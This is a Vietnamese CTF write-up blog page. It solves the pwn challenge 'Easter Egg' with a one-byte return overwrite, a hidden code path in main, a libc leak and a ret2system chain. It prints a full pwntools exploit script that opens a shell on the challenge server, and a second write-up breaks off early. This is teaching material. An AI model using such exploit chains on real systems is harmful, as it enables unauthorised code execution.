            <li><a href="#phân-tích-source-code-1">Phân tích source code</a></li>
            <li><a href="#lên-kịch-bản-khai-thác-1">Lên kịch bản khai thác</a></li>
            <li><a href="#tiến-hành-debug-1">Tiến hành debug</a></li>
            <li><a href="#viết-script-khai-thác-1">Viết script khai thác</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>


<script>
  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = false
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>


            
            
          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        



        <div class="article-content max-w-prose mb-20">
          
<h2 class="relative group">Easter Egg 
    <div id="easter-egg" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#easter-egg" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p><strong>Mô tả:</strong> People don&rsquo;t believe me when I say that you can still do a ret2libc with just one-byte overflow. Maybe you can prove them wrong by talking to my easter bunny.</p>
<p><strong>Note:</strong> Có ai tin được là tui tính để bài này ra hôm thi onsite không? =)))</p>

<h3 class="relative group">Setup 
    <div id="setup" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#setup" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Đề bài cung cấp cho mình 3 file: <code>chall</code>, <code>libc.so.6</code>, <code>ld-2.35.so</code>. Từ điểm này công với việc đọc sơ qua mô tả của đề thì khả năng cao là phải thực hiện kỹ thuật <em>ret2libc</em> để chiếm shell chương trình và đọc flag.</p>
<p>Chính vì đề cung cấp cho mình các file libc và loader để debug ở local giống với môi trường trên remote thì việc đầu tiên cần phải làm đó chính là link các file này lại với file thử thách. Để tự động hóa việc này thì các bạn có thể sử dụng <a
  href="https://github.com/io12/pwninit"
    target="_blank"
  >pwninit</a>.</p>
<pre tabindex="0"><code>$ pwninit
bin: ./chall
libc: ./libc.so.6
ld: ./ld-2.35.so

copying ./chall to ./chall_patched
running patchelf on ./chall_patched
writing solve.py stub

$ mv chall_patched chall

$ ls
chall  flag.txt  ld-2.35.so  libc.so.6  solve.py

$ ldd chall
        linux-vdso.so.1 (0x00007fff4c8fa000)
        libc.so.6 =&gt; ./libc.so.6 (0x00007fa15f83e000)
        ./ld-2.35.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fa15fa68000)
</code></pre><p>Vậy là việc link file challenge và libc đã hoàn thành.</p>

<h3 class="relative group">Phân tích source code 
    <div id="phân-tích-source-code" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ph%c3%a2n-t%c3%adch-source-code" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Các bạn có thể sử dụng tùy ý các Decompiler khác nhau để tiến hành việc đọc code của chương trình. Mình thì sử dụng <a
  href="https://hex-rays.com/ida-free/"
    target="_blank"
  >IDA Free</a> vì nó miễn phí và hỗ trợ file ELF 64-bit. Nếu bạn giàu thì có thể dùng bản Pro luôn cho máu.</p>
<p>Thông qua IDA, mình nhận thấy rằng chương trình có 3 hàm chính là <code>main</code>, <code>find_the_bunny</code> và <code>to_the_moon</code>. Pseudocode của hàm <code>main</code> mà IDA decompile ra được như sau:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;I heard the easter bunny wanna talk to you, but it&#39;s no where to be seen.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Can you find it?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">find_the_bunny</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Ở đây không có gì đặc biệt ngoài việc setup các buffer và sau đó gọi hàm <code>find_the_bunny</code>. Mình sẽ kiểm tra hàm này tiếp theo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">find_the_bunny</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Due to limited stamina, you can only overwrite 1 byte.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">57uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Hàm tạo một buffer 48 byte ở vị trí <code>rbp-0x30</code>, tức là buffer này cách rbp là 48 byte. Vậy thì nó sẽ cách địa chỉ trả về của hàm <code>find_the_bunny</code> là 56 byte (tính bằng khoảng cách với rbp + 8). Hàm này cho mình viết lên stack 57 byte cũng chính là chỉ cho phép ghi đè lên byte đầu tiên của địa chỉ trả về.</p>
<p>Ngoài ra thì còn một hàm nữa là <code>to_the_moon</code> mà không được gọi tới ở bất kỳ chỗ nào trong chương trình. Mình đoán là mục tiêu trước mắt là phải gọi được hàm này. Vậy nên mình sẽ thử xem nó có gì trước đã.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">to_the_moon</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You have found the easter bunny!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;It gave you a lot of stamina potions.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Hàm này cũng tạo một buffer 48 byte ở vị trí <code>rbp-0x30</code> nhưng lại đọc input đến tận 100 byte, cũng tức là mình có thể overflow stack đủ nhiều để sử dụng kỹ thuật <em>ret2libc</em> mà chiếm shell của chương trình.</p>

<h3 class="relative group">Lên kịch bản khai thác 
    <div id="lên-kịch-bản-khai-thác" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#l%c3%aan-k%e1%bb%8bch-b%e1%ba%a3n-khai-th%c3%a1c" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Như đã phân tích ở trên, hàm <code>to_the_moon</code> sẽ là target chính nên mình phải bằng cách nào đó gọi được hàm này để khai thác lỗi buffer overflow để áp dụng kỹ thuật <em>ret2libc</em> chiếm shell chương trình.</p>
<p>Hàm <code>find_the_bunny</code> chỉ cho mình ghi đè lên được byte đầu tiên của địa chỉ trả về, nhưng vì các hàm này đểu thuộc chương trình gốc mà không phải hàm của libc nên trên lý thuyết thì chúng được đặt gần nhau và do đó có thể chỉ cần ghi đè 1 byte thôi cũng đủ để nhảy qua hàm khác được.</p>
<p>Vậy hướng khai thác của mình có thể tóm gọn lại như sau:</p>
<ul>
<li>Overflow 1 byte của hàm <code>find_the_bunny</code> để nhảy tới hàm <code>to_the_moon</code>.</li>
<li>Lợi dụng lỗi buffer overflow của hàm <code>to_the_moon</code> để <em>ret2libc</em> và chiếm shell chương trình.</li>
</ul>

<h3 class="relative group">Tiến hành debug 
    <div id="tiến-hành-debug" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ti%e1%ba%bfn-h%c3%a0nh-debug" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Có khá nhiều plugin cho gdb để việc debug trở nên dễ dàng hơn nhưng đối với người chơi pwn thì thường sử dụng nhất là <a
  href="https://github.com/pwndbg/pwndbg"
    target="_blank"
  >pwndbg</a>.</p>
<p>Nếu các bạn đã tới được bước này rồi thì đương nhiên sẽ gặp được chướng ngại lớn nhất của đề.</p>
<p>Khi tiến hành debug địa chỉ trả về của <code>find_the_bunny</code>, mình nhận thấy rằng ở luồng thực thi thông thường chương trình sẽ nhảy về địa chỉ lệnh <code>main+82</code> tức là tại</p>
<pre tabindex="0"><code>0x0000000000401240 &lt;main+82&gt;:    jmp    0x401264 &lt;main+118&gt;
</code></pre><p>Tuy nhiên, địa chỉ bắt đầu của hàm <code>to_the_moon</code> lại nằm ở <code>0x401176</code>, 2 địa chỉ này khác biệt nhau tận 2 byte và do đó, việc ghi đè 1 byte để nhảy từ địa chỉ trả về của hàm <code>find_the_bunny</code> đến hàm <code>to_the_moon</code> là bất khả thi.</p>
<p>Nếu các bạn tới được đây và cho rằng hết cách rồi, hoặc đi xin tác giả được ghi đè lên 2 byte thì không nhé. Vì chương trình này còn 1 thứ rất hay mà chỉ khi debug thì mới biết được.</p>

<h3 class="relative group">Điểm bất thường của chương trình 
    <div id="điểm-bất-thường-của-chương-trình" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%c4%91i%e1%bb%83m-b%e1%ba%a5t-th%c6%b0%e1%bb%9dng-c%e1%bb%a7a-ch%c6%b0%c6%a1ng-tr%c3%acnh" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Khi disassemble hàm <code>main</code> ra thì mình có được đoạn code assembly sau:</p>
<pre tabindex="0"><code>pwndbg&gt; disass main
Dump of assembler code for function main:
   0x00000000004011ee &lt;+0&gt;:     endbr64
   0x00000000004011f2 &lt;+4&gt;:     push   rbp
   0x00000000004011f3 &lt;+5&gt;:     mov    rbp,rsp
   0x00000000004011f6 &lt;+8&gt;:     mov    rax,QWORD PTR [rip+0x2e53]        # 0x404050 &lt;stdin@@GLIBC_2.2.5&gt;
   0x00000000004011fd &lt;+15&gt;:    mov    esi,0x0
   0x0000000000401202 &lt;+20&gt;:    mov    rdi,rax
   0x0000000000401205 &lt;+23&gt;:    call   0x401070 &lt;setbuf@plt&gt;
   0x000000000040120a &lt;+28&gt;:    mov    rax,QWORD PTR [rip+0x2e2f]        # 0x404040 &lt;stdout@@GLIBC_2.2.5&gt;
   0x0000000000401211 &lt;+35&gt;:    mov    esi,0x0
   0x0000000000401216 &lt;+40&gt;:    mov    rdi,rax
   0x0000000000401219 &lt;+43&gt;:    call   0x401070 &lt;setbuf@plt&gt;
   0x000000000040121e &lt;+48&gt;:    lea    rdi,[rip+0xe6b]        # 0x402090
   0x0000000000401225 &lt;+55&gt;:    call   0x401060 &lt;puts@plt&gt;
   0x000000000040122a &lt;+60&gt;:    lea    rdi,[rip+0xea9]        # 0x4020da
   0x0000000000401231 &lt;+67&gt;:    call   0x401060 &lt;puts@plt&gt;
   0x0000000000401236 &lt;+72&gt;:    mov    eax,0x0
   0x000000000040123b &lt;+77&gt;:    call   0x4011b8 &lt;find_the_bunny&gt;
   0x0000000000401240 &lt;+82&gt;:    jmp    0x401264 &lt;main+118&gt;
   0x0000000000401242 &lt;+84&gt;:    lea    rdi,[rip+0xea7]        # 0x4020f0
   0x0000000000401249 &lt;+91&gt;:    call   0x401060 &lt;puts@plt&gt;
   0x000000000040124e &lt;+96&gt;:    xor    rdi,rdi
   0x0000000000401251 &lt;+99&gt;:    mov    rsi,rsp
   0x0000000000401254 &lt;+102&gt;:   add    rsi,0x8
   0x0000000000401258 &lt;+106&gt;:   mov    rdx,0x8
   0x000000000040125f &lt;+113&gt;:   call   0x401080 &lt;read@plt&gt;
   0x0000000000401264 &lt;+118&gt;:   nop
   0x0000000000401265 &lt;+119&gt;:   pop    rbp
   0x0000000000401266 &lt;+120&gt;:   ret
End of assembler dump.
</code></pre><p>Thấy điều gì kỳ lạ không???</p>
<p>Tại <code>main+77</code>, chương trình tiến hành gọi hàm <code>find_the_bunny</code> và set địa chỉ trả về tại <code>main+82</code>. Tuy nhiên, khi đến địa chỉ lệnh tại <code>main+82</code> chương trình lại nhảy thẳng xuống <code>main+118</code> tức là khúc mà hàm main kết thúc, hoàn toàn bỏ qua hẳn một đoạn 7 dòng code assembly nằm giữa.</p>
<p>Cũng chính bởi câu lệnh <code>jmp    0x401264 &lt;main+118&gt;</code> đặc biệt này mà các decompiler đã bị đánh lừa và nghĩ rằng hàm <code>main</code> sau khi gọi <code>find_the_bunny</code> sẽ kết thúc. Xin chúc mừng bạn vừa tìm đc Easter Egg của chương trình, cũng chính là tên của đề.</p>
<p>Quay trở lại vấn đề chính, mình có thể đọc thử và đoán xem đoạn này chương trình sẽ làm gì.</p>
<p>Đầu tiên là khúc</p>
<pre tabindex="0"><code>   0x0000000000401242 &lt;+84&gt;:    lea    rdi,[rip+0xea7]        # 0x4020f0
   0x0000000000401249 &lt;+91&gt;:    call   0x401060 &lt;puts@plt&gt;
</code></pre><p>có lẽ chương trình sẽ in ra một string nào đó. Cái này thừa thải nên mình không cần để ý thêm.</p>
<p>Tiếp theo là đoạn còn lại này:</p>
<pre tabindex="0"><code>   0x000000000040124e &lt;+96&gt;:    xor    rdi,rdi
   0x0000000000401251 &lt;+99&gt;:    mov    rsi,rsp
   0x0000000000401254 &lt;+102&gt;:   add    rsi,0x8
   0x0000000000401258 &lt;+106&gt;:   mov    rdx,0x8
   0x000000000040125f &lt;+113&gt;:   call   0x401080 &lt;read@plt&gt;
</code></pre><p>Khi phân tích kỹ ra thì khúc này chương trình sẽ đọc 8 byte input của mình và lưu nó ở <code>rsp+8</code>. Mà <code>rsp+8</code> của hàm <code>main</code> khi này sẽ là chính địa chỉ trả về của hàm <code>main</code> luôn.</p>
<p>Vậy tức là nếu mình tới được đoạn này thì sẽ có thể ghi đè lên địa chỉ trả về của <code>main</code> và từ đó nhảy tới được hàm <code>to_the_moon</code>. Và điều này hoàn toàn có thể thực hiện được do đoạn code assembly này nằm ngay dưới địa chỉ lệnh mà hàm <code>find_the_bunny</code> sẽ trở về sau khi kết thúc mà do đó chỉ khác biệt nhau đúng duy nhất 1 byte đầu tiên.</p>

<h3 class="relative group">Lên kịch bản khai thác lần 2 
    <div id="lên-kịch-bản-khai-thác-lần-2" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#l%c3%aan-k%e1%bb%8bch-b%e1%ba%a3n-khai-th%c3%a1c-l%e1%ba%a7n-2" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Vậy hướng khai thác mới sẽ là như sau:</p>
<ul>
<li>Overflow 1 byte của hàm <code>find_the_bunny</code> để nhảy tới đoạn bị ẩn của hàm <code>main</code> tại <code>main+84</code>.</li>
<li>Viết đè lên địa chỉ trả về của hàm <code>main</code> để nhảy tới hàm <code>to_the_moon</code>.</li>
<li>Lợi dụng lỗi buffer overflow của hàm <code>to_the_moon</code> để <em>ret2libc</em> và chiếm shell chương trình.</li>
</ul>

<h3 class="relative group">Viết script khai thác 
    <div id="viết-script-khai-thác" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#vi%e1%ba%bft-script-khai-th%c3%a1c" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p><del>Mình để ý là ai mở ticket để hỏi về bài này cũng đều biết cách khai thác nhưng không thành công do chủ yếu scripting còn hơi lỏ đấy nhá</del></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./chall&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#io = process()</span>
</span></span><span class="line"><span class="cl"><span class="c1">#gdb.attach(io, api=True)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;34.87.54.101&#39;</span><span class="p">,</span> <span class="mi">4204</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4012d3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stage 1: jump to the vulnerable function</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;i&#39;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x42</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;byte.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;more!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;to_the_moon&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stage 2: leak libc</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;i&#39;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;to_the_moon&#39;</span><span class="p">])</span> <span class="c1"># Back to the vulnerable function to continue exploiting</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;potions.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stage 3: ret2system</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;i&#39;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">())</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;potions.</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Chạy script và lấy flag thôi nào</p>
<pre tabindex="0"><code>$ python exp.py
[+] Opening connection to 34.87.54.101 on port 4204: Done
[*] Libc base: 0x7f83a8c58000
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
BKISC{0n3_c4n_35c4p3_7h3_3y3s_0f_th3_d3c0mp1l3r_bu7_n0t_7h3_d3bu99er}
</code></pre>
<h2 class="relative group">You Can&rsquo;t See Me 
    <div id="you-cant-see-me" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#you-cant-see-me" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p><strong>Mô tả:</strong> The real magic is things that happen when your eyes can not see.</p>

<h3 class="relative group">Setup 
    <div id="setup-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#setup-1" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Tương tự như trên, đề cũng cho 3 file: <code>chall</code>, <code>libc.so.6</code>, <code>ld-linux-x86-64.so.2</code>. Mình sẽ link lại chúng trước để tiện cho việc debug sau này hơn.</p>
<pre tabindex="0"><code>$ pwninit
bin: ./chall
libc: ./libc.so.6
ld: ./ld-linux-x86-64.so.2

copying ./chall to ./chall_patched
running patchelf on ./chall_patched
writing solve.py stub

$ mv chall_patched chall

$ ls
chall  flag.txt  ld-linux-x86-64.so.2  libc.so.6  solve.py

$ ldd chall
        linux-vdso.so.1 (0x00007ffd12af3000)
        libc.so.6 =&gt; ./libc.so.6 (0x00007fefb2b5b000)
        ./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fefb2d85000)
</code></pre>
<h3 class="relative group">Phân tích source code 
    <div id="phân-tích-source-code-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ph%c3%a2n-t%c3%adch-source-code-1" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Chương trình chỉ có 2 hàm chính là <code>main</code> và <code>get_msg</code>. Như thường lệ thì mình sẽ coi hàm <code>main</code> trước.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
